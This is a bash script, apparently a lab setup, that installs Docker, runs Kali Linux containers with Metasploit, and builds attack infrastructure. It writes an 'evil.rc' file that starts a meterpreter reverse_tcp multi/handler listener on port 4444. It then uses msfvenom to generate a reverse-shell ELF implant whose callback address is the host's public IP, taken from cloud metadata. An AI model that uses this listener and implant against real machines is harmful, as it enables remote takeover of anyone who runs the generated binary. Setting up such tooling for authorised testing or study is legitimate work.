#!/bin/bash

# Do we want to ansible this whole thing?

install_docker(){
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
    sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
    sudo apt update
    apt-cache policy docker-ce
    sudo apt install -y docker-ce
}

run_containers(){
    docker pull kalilinux/kali-linux-docker
    # Msf playground
    docker run -d -v /root/.msf4:/root/.msf4 -p 4444:4444 -it \
        --name=kali kalilinux/kali-linux-docker
    # Msfdev environment
    docker run -d -v /root/.msf4:/root/.msf4 -it \
        --name=msf kalilinux/kali-linux-docker
}

setup_containers(){
    docker exec -it kali apt update
    docker exec -it kali apt install -y metasploit-framework
    docker exec -it msf apt update
}

setup_db(){
    docker exec -it kali service postgresql start
    docker exec -it kali msfdb init
}

gen_rc(){
    echo "use exploit/multi/handler" >> evil.rc
    echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> evil.rc
    echo "set LHOST 0.0.0.0" >> evil.rc
    echo "set LPORT 4444" >> evil.rc
    echo "set ExitOnSession false" >> evil.rc
    echo "exploit -j -z" >> evil.rc
    docker exec -it kali mkdir -p /root/.msf4
    docker cp evil.rc kali:/root/.msf4/evil.rc
}

gen_payload(){
    echo "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$(curl 169.254.169.254/latest/meta-data/public-ipv4) LPORT=4444 -f elf > /root/.msf4/shell.elf" > /tmp/venom.sh
    docker cp /tmp/venom.sh kali:/tmp/venom.sh
    docker exec -it kali bash /tmp/venom.sh
    docker cp kali:/root/.msf4/shell.elf /tmp/shell.elf
}

setup_msf()
{
    docker cp /tmp/msf_dev.sh msf:/tmp/msf_dev.sh
    docker exec -it msf bash /tmp/msf_dev.sh
}

install_docker
run_containers
setup_containers
setup_db
gen_rc
gen_payload
setup_msf